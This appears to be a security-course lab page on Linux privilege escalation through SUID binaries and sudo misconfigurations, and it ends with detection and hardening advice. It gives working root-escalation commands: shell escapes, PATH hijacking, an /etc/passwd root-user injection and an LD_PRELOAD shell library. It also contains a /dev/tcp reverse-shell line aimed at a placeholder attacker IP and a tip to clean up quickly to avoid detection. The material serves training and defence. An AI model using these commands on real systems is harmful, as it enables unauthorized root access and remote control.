---
title: "Linux PrivEsc Lab 1 — SUID Binary and Sudo Misconfiguration"
tags: [linux, privilege-escalation, SUID, sudo, GTFOBins, lab, T1548.001,
       T1548.003, ATT&CK, hands-on]
module: 04-BroadSurface-04
day: 235
related_topics:
  - Linux PrivEsc Enumeration (Day 234)
  - Linux PrivEsc Lab 2 — Cron and Writable Files (Day 236)
  - Kernel Exploits (Day 237)
  - Infrastructure Detection and Hardening (Day 244)
---

# Day 235 — Linux PrivEsc Lab 1: SUID Binary and Sudo Misconfiguration

> "SUID is the original mistake. Someone decided that a binary needs to run
> as root regardless of who calls it — and then that binary grew features,
> accepted user input, and called external programs. Every one of those
> features is a surface. The question is: does any of them let you escape the
> intended function and reach a shell? Most of the time: yes."
>
> — Ghost

---

## Goals

By the end of this lab you will have:

1. Exploited a non-standard SUID binary using a shell escape.
2. Exploited a `sudo` NOPASSWD misconfiguration via GTFOBins.
3. Exploited a `sudo` command with an argument injection vulnerability.
4. Escalated to root on all three paths in the lab environment.
5. Written detection logic for each escalation path.

**Time budget:** 4–5 hours.

---

## Prerequisites

| Requirement | Covered in |
|---|---|
| SUID enumeration commands | Day 234 |
| GTFOBins familiarity | Day 234 |
| sudo -l output interpretation | Day 234 |
| Linux file permissions | Days 9–16 |

---

## Lab Setup

```bash
cd 04-BroadSurface-04/samples/privesc-lab-1/
docker compose up -d

# Lab provides a container with:
# - A low-privilege user: labuser / labuser123
# - Three privilege escalation paths (find them yourself)
# - Root flag at /root/flag.txt

# Connect as labuser:
docker exec -it -u labuser privesc-lab bash

# Or SSH:
ssh labuser@localhost -p 2222
# Password: labuser123
```

---

## Path 1 — Non-Standard SUID Binary

### Step 1: Enumerate SUID Binaries

```bash
# Run as labuser
find / -perm -4000 -type f 2>/dev/null | sort

# Expected output includes standard binaries (passwd, su, sudo, ping)
# and one non-standard binary — find it
```

**Hint:** Look for a binary that is not in the standard Ubuntu/Debian SUID list.
Standard SUID binaries include: `/usr/bin/passwd`, `/usr/bin/sudo`,
`/usr/bin/su`, `/usr/bin/newgrp`, `/usr/bin/chsh`, `/usr/bin/gpasswd`,
`/bin/ping`, `/bin/mount`, `/bin/umount`.

If you see anything else — especially in `/opt/`, `/usr/local/`, or `/home/` —
that is your target.

### Step 2: Identify the Binary

```bash
# What is it?
file /path/to/suid-binary
strings /path/to/suid-binary | head -50

# Does it appear in GTFOBins?
# https://gtfobins.github.io/ → search for the binary name → SUID section

# What does it do?
/path/to/suid-binary --help 2>&1
```

### Step 3: Exploit

Most SUID binary exploits fall into one of these patterns:

**Pattern A — Shell escape via editor feature:**
```bash
# If it is an editor (vim, nano, less, more, man)
# vim:
vim -c ':!/bin/bash -p'
# nano: ^R^X then: reset; sh 1>&0 2>&0
# less/more: !bash -p
```

**Pattern B — Interpreter (python, perl, ruby, awk):**
```bash
# python3:
python3 -c 'import os; os.execl("/bin/bash", "bash", "-p")'

# awk:
awk 'BEGIN {system("/bin/bash -p")}'

# perl:
perl -e 'exec "/bin/bash", "-p"'
```

**Pattern C — Binary that calls external programs:**
```bash
# If the binary calls system(), popen(), or exec() with a user-controlled path:
# 1. Create a malicious binary in a directory you control
mkdir -p /tmp/exploit
echo '#!/bin/bash' > /tmp/exploit/ls
echo '/bin/bash -p' >> /tmp/exploit/ls
chmod +x /tmp/exploit/ls

# 2. Prepend your directory to PATH
export PATH=/tmp/exploit:$PATH

# 3. Run the SUID binary — when it calls 'ls', it runs your version
/path/to/suid-binary
```

### Confirm Root

```bash
id
# uid=0(root) or euid=0(root)
cat /root/flag.txt
```

---

## Path 2 — Sudo NOPASSWD Misconfiguration

### Step 1: Check sudo Permissions

```bash
sudo -l

# Look for lines like:
# (root) NOPASSWD: /usr/bin/find
# (root) NOPASSWD: /usr/bin/vim
# (root) NOPASSWD: /usr/bin/less
# (root) NOPASSWD: /usr/bin/python3
# (root) NOPASSWD: /bin/tar
# (root) NOPASSWD: /usr/bin/tee
# (root) NOPASSWD: /usr/bin/nano
```

### Step 2: Exploit via GTFOBins

**sudo find:**
```bash
sudo find . -exec /bin/bash \; -quit
# or:
sudo find /tmp -exec bash -c 'exec bash -i &>/dev/tcp/<attacker-ip>/4444 <&1' \; -quit
```

**sudo vim:**
```bash
sudo vim -c ':!/bin/bash'
# or:
sudo vim -c ':py3 import os; os.execl("/bin/bash", "bash")'
```

**sudo less:**
```bash
sudo less /etc/passwd
# Then type: !/bin/bash
```

**sudo python3:**
```bash
sudo python3 -c 'import os; os.execl("/bin/bash", "bash")'
```

**sudo tee (write to any file):**
```bash
# Add a new root user to /etc/passwd
echo 'ghost::0:0:root:/root:/bin/bash' | sudo tee -a /etc/passwd
su ghost  # no password required
```

**sudo nano:**
```bash
sudo nano
# Ctrl+R → Ctrl+X → type: reset; sh 1>&0 2>&0
```

**sudo tar:**
```bash
sudo tar -cf /dev/null /dev/null --checkpoint=1 \
  --checkpoint-action=exec=/bin/bash
```

### Confirm Root

```bash
id && cat /root/flag.txt
```

---

## Path 3 — Sudo Argument Injection

Some sudo entries appear safe but are exploitable via argument injection.

### Common Vulnerable Patterns

**Wildcard in sudo rule:**
```bash
# sudo -l output:
# (root) NOPASSWD: /usr/bin/python3 /opt/monitor.py *

# The * lets you inject Python flags:
sudo /usr/bin/python3 /opt/monitor.py -c 'import os; os.system("/bin/bash")'
```

**Path with no leading slash (relative command):**
```bash
# sudo -l output:
# (root) NOPASSWD: /usr/bin/env python3 /opt/monitor.py

# Abuse env to change PATH:
sudo /usr/bin/env PATH=/tmp/exploit:$PATH python3 /opt/monitor.py
# Where /tmp/exploit/python3 is your malicious script
```

**LD_PRELOAD injection (if env_keep includes LD_PRELOAD):**
```bash
# sudo -l output includes:
# env_keep += LD_PRELOAD

# Create a shared library that spawns a shell:
cat > /tmp/shell.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
    setuid(0);
    setgid(0);
    system("/bin/bash -p");
}
EOF
gcc -shared -fPIC -nostartfiles -o /tmp/shell.so /tmp/shell.c

# Use it with any allowed sudo command:
sudo LD_PRELOAD=/tmp/shell.so find
```

---

## Part 4 — Detection and Hardening

### Detecting SUID Abuse

```bash
# Audit all SUID binaries on the system and alert on changes
find / -perm -4000 -type f 2>/dev/null | md5sum > /var/log/suid-baseline.txt
# Run daily and compare:
find / -perm -4000 -type f 2>/dev/null | md5sum | \
  diff /var/log/suid-baseline.txt -

# auditd rule to detect SUID execution:
# -a always,exit -F arch=b64 -S execve -F euid=0 -F auid!=0 -k suid_execution
```

**SIEM alert pattern:** process with `euid=0` but `uid != 0`, parent process
is not sudo, su, or a known setuid wrapper.

### Detecting sudo Abuse

```bash
# sudo logs all executions to /var/log/auth.log (Debian) or /var/log/secure (RHEL)
grep "sudo" /var/log/auth.log | grep "COMMAND"

# Sigma rule pattern:
# event.type: process AND process.parent.name: sudo
# AND process.name: (bash OR sh OR python* OR vim OR find)
# AND user.name != root
```

### Hardening

```bash
# Review sudoers — remove all NOPASSWD entries for interactive binaries
visudo

# Safe pattern: allow only specific scripts, never interpreters
# GOOD: (root) NOPASSWD: /opt/backup/run-backup.sh
# BAD:  (root) NOPASSWD: /usr/bin/python3

# Remove the SUID bit from binaries that do not need it:
chmod u-s /usr/bin/the-binary

# Use capabilities instead of SUID where possible:
# Instead of SUID on ping (to bind raw sockets):
setcap cap_net_raw+ep /bin/ping
chmod u-s /bin/ping

# Restrict sudo with command arguments:
# (root) NOPASSWD: /usr/bin/systemctl restart nginx
# → only allows restarting nginx, not 'systemctl start bash'
```

---

## Key Takeaways

1. **Non-standard SUID binaries are always worth investigating.** Anything not
   in the OS default set was put there by a human — humans make mistakes.
2. **GTFOBins is your reference, not your shortcut.** Know the underlying reason
   each technique works: shell escape, subprocess call, file write. That knowledge
   transfers to binaries not yet in GTFOBins.
3. **NOPASSWD sudo for interpreters = root.** Any language interpreter given
   unrestricted sudo access provides an instant root shell. `vim`, `less`, and
   `man` are equally dangerous — they have shell escape features.
4. **Argument injection expands the attack surface.** A sudo rule that looks
   safe (specific script path) may still be exploitable via flags, environment
   variables, or wildcard arguments.
5. **auditd catches SUID and sudo abuse.** A defender monitoring for euid=0
   processes spawned by non-root users with unusual parents will see your attack.
   Speed matters — get root, do what you need, clean up quickly.

---

## Exercises

1. Find a binary on your system (or the lab container) that is SUID but does
   not appear in GTFOBins. Analyse it with `strings` and `ltrace`. Does it call
   any external programs? Can you exploit it via PATH manipulation?

2. Write a sudoers entry that grants a user the ability to restart a specific
   service without giving them a path to root. Test it — does it actually
   prevent escalation, or is there an argument injection vector you missed?

3. Write an auditd configuration (`/etc/audit/rules.d/privesc.rules`) that
   captures: (a) all SUID binary executions where euid changes to 0, (b) all
   sudo command executions, (c) any write to `/etc/passwd` or `/etc/sudoers`.

4. Research: what is the `sudoedit` / `sudo -e` privilege escalation
   (CVE-2021-3156 and CVE-2023-22809)? What conditions are required? Is it
   still exploitable on current sudo versions?

---

## Questions

> Add your questions here. Each question gets a Global ID (Q235.1, Q235.2 …).
> Follow-up questions use hierarchical numbering (Q235.1.1, Q235.1.2 …).

---

## Navigation

← Previous: [Day 234 — Linux PrivEsc Enumeration](DAY-0234-Linux-PrivEsc-Enumeration.md)
→ Next: [Day 236 — Linux PrivEsc Lab 2: Cron and Writable Files](DAY-0236-Linux-PrivEsc-Lab-2-Cron-and-Writable.md)
